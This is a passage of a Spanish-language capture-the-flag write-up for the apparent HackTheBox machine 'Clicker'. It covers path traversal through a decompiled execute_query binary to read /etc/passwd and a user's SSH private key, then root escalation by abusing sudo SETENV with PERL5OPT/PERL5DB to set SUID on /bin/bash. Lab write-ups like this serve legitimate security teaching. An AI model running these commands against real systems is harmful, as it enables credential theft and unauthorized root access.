+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="n">rax_6</span> <span class="n">u</span><span class="o">&gt;</span> <span class="mi">4</span> <span class="o">||</span> <span class="n">rax_6</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">||</span> <span class="n">rax_6</span> <span class="o">==</span> <span class="mi">2</span> <span class="o">||</span> <span class="n">rax_6</span> <span class="o">==</span> <span class="mi">3</span> <span class="o">||</span> <span class="n">rax_6</span> <span class="o">==</span> <span class="mi">4</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Despues se declara la variable <strong>var_98</strong> y en la linea de abajo se copia la cadena <strong>/home/jack/queries</strong> a <strong>var_98</strong></p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int64_t</span> <span class="n">var_98</span>
+<span class="n">__builtin_strcpy</span><span class="p">(</span><span class="n">dest</span><span class="o">:</span> <span class="o">&amp;</span><span class="n">var_98</span><span class="p">,</span> <span class="n">src</span><span class="o">:</span> <span class="s">"/home/jack/queries/"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Viendo el directorio <strong>/home/jack/queries/</strong> podemos deducir que el contexto de ejecucion es en ese directorio.</p>
+
+<p>La vulnerabilidad en este codigo radica en el case por default</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">default</span>
+    <span class="n">strncpy</span><span class="p">(</span><span class="n">rax_7</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="mh">0x14</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Como mencione anteriormente, cuando se usa el case por default ahora el programa recibe dos argumentos y lo copia al espacio en memoria al que apunta <strong>rax_7</strong>, el problema es que a la funcion <strong>strncpy</strong> no se le especifica que copie una cadena en especifico, como en los demas case, si no que copia el segundo argumento. Para explotarlo debemos de ejecutar el programa pasandole un argumento que ejecute el case por default (numero mayor a 4 no importa cual sea)</p>
+
+<p><img src="/assets/img/clicker/9.png" alt="" /></p>
+
+<p>Y podemos ver como se ocasiona una violacion de segmento, lo otro que tenemos que hacer pasarle la ruta de un archivo, por ejemplo el <strong>passwd</strong> y vamos a poder leerlo</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">.</span><span class="nf">/</span><span class="n">execute_query</span> <span class="mi">12</span> <span class="o">..</span><span class="sr">/../</span><span class="o">..</span><span class="sr">/etc/</span><span class="n">passwd</span>
+</code></pre></div></div>
+<p><img src="/assets/img/clicker/10.png" alt="" /></p>
+
+<p>Observa que tuve que usar <strong>../</strong> para salir del directorio <strong>/home/jack/queries/</strong></p>
+
+<p>Ahora, como sabemos que existe el <strong>jack</strong> podemos intentar leer su id_rsa</p>
+
+<p><img src="/assets/img/clicker/11.png" alt="" /></p>
+
+<p>Para conectarse por SSH, la clave privada esta mal formateada, puedes generar un par de claves con ssh-keygen y compararlas</p>
+
+<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>
+
+<p>Si mostramos los permisos de nivel de sudoers, veremos que podemos ejecutar el script <strong>monitor.sh</strong> como root sin contraseña:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">User</span> <span class="n">jack</span> <span class="n">may</span> <span class="n">run</span> <span class="n">the</span> <span class="n">following</span> <span class="n">commands</span> <span class="n">on</span> <span class="ss">clicker:
+    </span><span class="p">(</span><span class="no">ALL</span> <span class="p">:</span> <span class="no">ALL</span><span class="p">)</span> <span class="no">ALL</span>
+    <span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="no">SETENV</span><span class="p">:</span> <span class="no">NOPASSWD</span><span class="p">:</span> <span class="sr">/opt/moni</span><span class="n">tor</span><span class="p">.</span><span class="nf">sh</span>
+</code></pre></div></div>
+<p>Codigo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+<span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$EUID</span><span class="s2">"</span> <span class="nt">-ne</span> 0 <span class="o">]</span>
+  <span class="k">then </span><span class="nb">echo</span> <span class="s2">"Error, please run as root"</span>
+  <span class="nb">exit
+</span><span class="k">fi
+
+</span><span class="nb">set </span><span class="nv">PATH</span><span class="o">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+<span class="nb">unset </span>PERL5LIB<span class="p">;</span>
+<span class="nb">unset </span>PERLLIB<span class="p">;</span>
+
+<span class="nv">data</span><span class="o">=</span><span class="si">$(</span>/usr/bin/curl <span class="nt">-s</span> http://clicker.htb/diagnostic.php?token<span class="o">=</span>secret_diagnostic_token<span class="si">)</span><span class="p">;</span>
+/usr/bin/xml_pp <span class="o">&lt;&lt;&lt;</span> <span class="nv">$data</span><span class="p">;</span>
+<span class="k">if</span> <span class="o">[[</span> <span class="nv">$NOSAVE</span> <span class="o">==</span> <span class="s2">"true"</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then
+    </span><span class="nb">exit</span><span class="p">;</span>
+<span class="k">else
+    </span><span class="nv">timestamp</span><span class="o">=</span><span class="si">$(</span>/usr/bin/date +%s<span class="si">)</span>
+    /usr/bin/echo <span class="nv">$data</span> <span class="o">&gt;</span> /root/diagnostic_files/diagnostic_<span class="k">${</span><span class="nv">timestamp</span><span class="k">}</span>.xml
+<span class="k">fi</span>
+</code></pre></div></div>
+<p>Este script parece hacer un tipo diagnostico y lo guarda en el archivo  <strong>/root/diagnostic_files/diagnostic…</strong>, sin embargo, podemos ver que hace uso de variables de entorno de perl (PERL5LIB, PERLLIB), en este caso usa <strong>unset</strong> para eliminar esas variables de entorno en tiempo de ejecucion. Tomando en cuenta el uso de variables de entorno de perl y el uso de <strong>/usr/bin/xml_pp</strong> (otro script de perl), nosotros podemos abusar de las variables de entorno de perl para ejecutar comandos, mas en particular de <strong>PERL5DB</strong> y <strong>PERL5OPT</strong>, esta vulnerabilidad se le conoce como <strong>perl_startup</strong></p>
+
+<p>Para explotarla podemos ingresar:</p>
+
+<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">sudo</span> <span class="nv">PERL5OPT</span><span class="o">=-</span><span class="nv">d</span> <span class="nv">PERL5DB</span><span class="o">=</span><span class="p">'</span><span class="s1">exec "chmod u+s /bin/bash"</span><span class="p">'</span> <span class="sr">/opt/moni</span><span class="nv">tor</span><span class="o">.</span><span class="nv">sh</span>
+</code></pre></div></div>
+
+<ul>
+  <li>PERL5OPT=-d: se establece la variable de entorno <strong>PERLOPT5</strong> con el argumento -d, que significa modo de depuracion,</li>
+  <li>Posteriormente se establece la variable de entorno <strong>PERL5DB</strong> con el valor de <strong>exec</strong> para ejecutar el comando que sigue</li>
+</ul>
+
+<p>Basicamente lo que estara haciendo es ejecutar el script <strong>monitor.sh</strong> en modo de depuracion, y tomando en cuenta que podemos establecer variables de entorno, usamos <strong>PERL5OPT</strong> y <strong>PERL5DB</strong>  para ejecutar un comando arbitrario a la hora de depurar el script</p>
+
+<p>Ahora solo queda ejecutar <strong>bash -p</strong> y seremos root</p>
+
+<p><img src="/assets/img/clicker/12.png" alt="" /></p>
+
+<p>Eso ha sido todo, gracias por leer ❤</p>
+:ET
